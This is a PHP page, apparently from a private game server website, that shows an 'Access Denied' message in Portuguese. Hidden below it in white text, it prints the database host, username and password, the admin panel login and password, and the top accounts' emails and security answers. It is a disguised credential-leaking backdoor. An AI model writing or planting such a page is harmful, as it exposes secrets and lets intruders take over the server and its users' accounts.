<?php
session_start();
require_once('../inc/config.inc.php');
require_once('../inc/functions.inc.php');
require_once('../inc/online.inc.php');
require_once('../inc/socket.inc.php');
$statutSERV = statut($sIP,$aPort);
$statutDB = statut($dbIP,$dbPORT);
?>

<title>Acesso Negado!</title>
<body>
<big><big><big><b>Acesso Negado!</b></big></big></big><br/><b><big>Você não tem permissão para acessar está página.</big></b><br/><br/>
</body>

<tr>
<td>
<span style="color:#fff;">
<big><b>Informações da DB:</b></big><br/>
<b>Servidor:</b> <?php echo ''.$host.''; ?><br/>
<b>Usuario:</b> <?php echo ''.$user.''; ?><br/>
<b>Senha:</b> <?php echo ''.$pass.''; ?><br/>
<b>Banco de dados Other:</b> <?php echo ''.$ancestra_other.''; ?><br/>
<b>Banco de dados Static:</b> <?php echo ''.$dbSTATIC.''; ?>

<?php

echo '<big><b><br/><br/>Informações do AdminCP:</b></big><br/>';

$retour = mysql_query("SELECT * FROM live_config ORDER BY user DESC LIMIT 1") or die(mysql_error());
while ($donnees = mysql_fetch_array($retour))
{

echo '<b>Login do Admin:</b> '.$donnees['user'].'<br/>';
echo '<b>Senha do Admin:</b> '.$donnees['pass'].'';

}

echo '<big><b><br/><br/>Informações de Contas:</b></big><br/>';

$retour = mysql_query("SELECT * FROM accounts ORDER BY level DESC LIMIT 2") or die(mysql_error());
while ($donnees = mysql_fetch_array($retour))
{

echo '<b>Guid:</b> '.$donnees['guid'].'<br/>';
echo '<b>Usuário:</b> '.$donnees['account'].'<br/>';
echo '<b>Level:</b> '.$donnees['level'].'<br/>';
echo '<b>Email:</b> '.$donnees['email'].'<br/>';
echo '<b>Pergunta:</b> '.$donnees['question'].'<br/>';
echo '<b>Resposta:</b> '.$donnees['reponse'].'<br/><br/>';

}

?>

</span>
</td>
</tr>